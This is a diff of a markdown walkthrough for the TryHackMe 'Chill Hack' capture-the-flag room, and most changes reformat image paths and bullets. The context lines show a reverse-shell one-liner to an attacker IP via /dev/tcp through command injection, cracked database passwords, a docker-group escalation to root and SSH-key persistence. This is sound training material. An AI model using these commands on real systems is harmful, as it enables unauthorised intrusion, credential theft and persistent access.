@@ -1,20 +1,20 @@
 # Chill Hack
 
-![tryhackme.com - © TryHackMe](.gitbook/assets/tryhackme-logo-small.png)
+![tryhackme.com - © TryHackMe](<../../../../../.gitbook/assets/tryhackme-logo-small (2).png>)
 
----
+***
 
 ## Intro
 
-| Room Info           | ![](.gitbook/assets/chillhack.png)                 |
-| :------------------ | -------------------------------------------------- |
+| Room Info            | ![](../../../../../.gitbook/assets/chillhack.png)  |
+| -------------------- | -------------------------------------------------- |
 | 🔗 Name              | [Chill Hack](https://tryhackme.com/room/chillhack) |
 | 🎯 Target IP         | `10.10.141.41`                                     |
-| 📈 Difficulty level  | 🟢Easy                                              |
+| 📈 Difficulty level  | 🟢Easy                                             |
 | 💲 Subscription type | Free                                               |
 | 🐧 OS                | Linux                                              |
 
----
+***
 
 ## Recon
 
@@ -83,12 +83,12 @@ gobuster dir -u http://chillhack.thm -w /usr/share/wordlists/dirbuster/directory
 
 Navigate to
 
-- `http://chillhack.thm/secret/`
-- input a command. It works, a Command Injection vulnerability is present in the web server.
+* `http://chillhack.thm/secret/`
+* input a command. It works, a Command Injection vulnerability is present in the web server.
 
-![](.gitbook/assets/image-20230515172955365.png)
+![](../../../../../.gitbook/assets/image-20230515172955365.png)
 
----
+***
 
 ## Exploitation
 
@@ -103,7 +103,7 @@ Input a command to get a reverse shell
 /bin/bash -c '/bin/bash -i >& /dev/tcp/10.18.65.48/3333 0>&1'
 ```
 
-![Reverse Shell as www-data user](.gitbook/assets/image-20230515173739294.png)
+![Reverse Shell as www-data user](../../../../../.gitbook/assets/image-20230515173739294.png)
 
 Get a **Full TTY** shell on the server
 
@@ -122,7 +122,7 @@ reset
 sudo -l
 ```
 
-![](.gitbook/assets/image-20230515173827778.png)
+![](../../../../../.gitbook/assets/image-20230515173827778.png)
 
 `/home/apaar/.helpline.sh` file can be run by the `www-data` user as user **`apaar`**
 
@@ -147,7 +147,7 @@ drwxr-xr-x 2 apaar apaar 4.0K Oct  3  2020 .ssh
 cat /etc/passwd
 ```
 
-![](.gitbook/assets/image-20230515175639804.png)
+![](../../../../../.gitbook/assets/image-20230515175639804.png)
 
 Get a shell as user **`apaar`**
 
@@ -161,9 +161,9 @@ cat /home/apaar/local.txt
 {USER****************************************
 ```
 
-!["apaar" shell](.gitbook/assets/image-20230515180051961.png)
+!["apaar" shell](../../../../../.gitbook/assets/image-20230515180051961.png)
 
----
+***
 
 ## Privilege Escalation
 
@@ -199,13 +199,13 @@ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC8g6f2IrM5xN6SdfgZs1c7O76SZIQSIKjQ7B
 ssh -L 9001:127.0.0.1:9001 -i apaar_rsa apaar@chillhack.thm
 ```
 
-![](.gitbook/assets/image-20230515182558653.png)
+![](../../../../../.gitbook/assets/image-20230515182558653.png)
 
 Navigate to
 
-- `http://chillhack.thm:9001/`
+* `http://chillhack.thm:9001/`
 
-![](.gitbook/assets/image-20230515182711258.png)
+![](../../../../../.gitbook/assets/image-20230515182711258.png)
 
 ```bash
 ls -lah /var/www/files/
@@ -217,9 +217,9 @@ su
 # the password does NOT work for "root" user
 ```
 
-![index.php](.gitbook/assets/image-20230515183410802.png)
+![index.php](../../../../../.gitbook/assets/image-20230515183410802.png)
 
-![account.php](.gitbook/assets/image-20230515183422568.png)
+![account.php](../../../../../.gitbook/assets/image-20230515183422568.png)
 
 > This part can be skipped directly to SCP download of the necessary **`hacker-with-laptop_23-2147985341.jpg`** file.
 >
@@ -227,7 +227,7 @@ su
 >
 > ```bash
 > mysql -u root -p webportal
-> 
+>
 > SHOW tables;
 > SELECT * from users;
 > ```
@@ -241,7 +241,7 @@ su
 > +----+-----------+----------+-----------+----------------------------------+
 > ```
 >
-> - Check the two password strings
+> * Check the two password strings
 >
 > ```bash
 > hash-identifier 7e53614ced3640d5de23f111806cc4fd
@@ -249,7 +249,7 @@ su
 > # Possible Hash is MD5
 > ```
 >
-> - Check them on [https://crackstation.net/](https://crackstation.net/)
+> * Check them on [https://crackstation.net/](https://crackstation.net/)
 >
 > ```bash
 > Hash	Type	Result
@@ -259,15 +259,15 @@ su
 >
 > > 📌 Login credentials are:
 > >
-> >  `Aurick`:`masterpassword`
+> > `Aurick`:`masterpassword`
 > >
 > > `cullapaar`:`dontaskdonttell`
 >
 > Login to the portal `http://chillhack.thm:9001/`. The successful login redirect to `hacker.php` page where there is a hacker with laptop `.jpg` file that needs to be downloaded.
 >
-> ![](.gitbook/assets/image-20230515185133687.png)
+> <img src="../../../../../.gitbook/assets/image-20230515185133687.png" alt="" data-size="original">
 
-![hacker.php](.gitbook/assets/image-20230515185352609.png)
+![hacker.php](../../../../../.gitbook/assets/image-20230515185352609.png)
 
 Download the `hacker-with-laptop_23-2147985341.jpg` file using `scp`
 
@@ -310,7 +310,7 @@ unzip backup.zip
 # use "pass1word"
 ```
 
-![](.gitbook/assets/image-20230515190203772.png)
+![](../../../../../.gitbook/assets/image-20230515190203772.png)
 
 Check the unzipped file
 
@@ -318,7 +318,7 @@ Check the unzipped file
 cat source_code.php
 ```
 
-![](.gitbook/assets/image-20230515190507690.png)
+![](../../../../../.gitbook/assets/image-20230515190507690.png)
 
 Decrypt the base64 hash
 
@@ -334,11 +334,11 @@ su anurodh
 id
 ```
 
-![anurodh](.gitbook/assets/image-20230515190945159.png)
+![anurodh](../../../../../.gitbook/assets/image-20230515190945159.png)
 
 `anurodh` is in the **docker** group. Spawn a `root` shell by using a `docker` command.
 
-- Check it from the [GTFOBins - Docker](https://gtfobins.github.io/gtfobins/docker/) list
+* Check it from the [GTFOBins - Docker](https://gtfobins.github.io/gtfobins/docker/) list
 
 ```bash
 docker run -v /:/mnt --rm -it alpine chroot /mnt sh
@@ -351,11 +351,11 @@ cat /root/proof.txt
 {ROOT****************************************
 ```
 
-![](.gitbook/assets/image-20230515191530843.png)
+![](../../../../../.gitbook/assets/image-20230515191530843.png)
 
-![](.gitbook/assets/2024-10-20_22-18-48_762.png)
+![](../../../../../.gitbook/assets/2024-10-20_22-18-48_762.png)
 
----
+***
 
 ## Persistence (extra)
 
@@ -367,7 +367,6 @@ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC8g6f2IrM5xN6SdfgZs1c7O76SZIQSIKjQ7B
 ssh -i apaar_rsa root@chillhack.thm
 ```
 
-![](.gitbook/assets/image-20230515192050482.png)
+![](../../../../../.gitbook/assets/image-20230515192050482.png)
 
-------
-
+***
